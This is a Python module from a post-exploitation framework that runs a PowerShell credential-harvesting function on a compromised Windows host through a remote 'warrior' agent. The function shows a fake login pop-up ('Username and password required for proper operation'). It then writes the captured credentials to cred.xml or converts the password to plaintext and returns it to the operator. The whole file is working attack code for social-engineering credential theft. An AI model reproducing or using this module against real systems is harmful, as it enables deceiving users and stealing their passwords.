from termcolor import colored, cprint
from module import Module

class CustomModule(Module):

    def __init__(self):
        information = {"Name": "getcredentials",
                       "Description": "Get user credentials",
                       "Author": "@josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "title": ["Attention please", "Pop-Up Title", False],
                   "message": ["Username and password required for proper operation", "Pop-Up message", False],
                   "domain": ["", "User domain", False],
                   "persistent": ["false", "true to write credentials in disk", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)


    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function getcredentials  {
                    param(
                    [Parameter(Mandatory)]
                    [String] $title,
                    [Parameter(Mandatory)]
                    [String] $message,
                    [Parameter(Mandatory=$false)]
                    [String] $domain,
		    [switch]$persistent
                    )

                    if (-not $domain) { $domain = "" }
		    $credential = $host.ui.PromptForCredential($title, $message, "", $domain)

		    if ($persistent.IsPresent) {
		         $path = ($pwd.Path+"\cred.xml")
                         $credential | Export-Clixml -Path $path
                         return ("Credentials file: " + $path)
                    }
		    $passConvert = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password);
		    $noSecurePass = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($passConvert);
		    return ("User: " + $credential.UserName + " - Password: " + $noSecurePass)
                    # To Import
                    # $credential = Import-Clixml -Path ($pwd.Path+"\cred.xml")
                }
            """

        if self.args["persistent"].lower() == "true":
            function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -persistent"
        else:
            function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "'"

        super(CustomModule, self).run(function)